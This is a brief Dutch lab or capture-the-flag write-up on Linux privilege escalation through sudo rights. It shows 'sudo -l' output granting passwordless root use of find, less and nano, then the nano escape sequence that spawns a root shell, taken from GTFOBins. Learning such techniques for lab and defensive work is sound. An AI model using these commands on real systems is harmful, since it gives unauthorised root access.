## sudo

### Stapsgewijs

#### 1. Informatie opvragen

```
sudo -l
```

*Terugkomst:*

```
User karen may run the following commands on ip-10-10-19-10:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano
```

**Kan verschillende binarys runnen als sudo (root)**

#### 2. Opzoeken op gtfobins.github.io

![alt text](image.png)

#### 3. Sudo alinea runnen

```
sudo nano
^R^X
reset; sh 1>&0 2>&0
```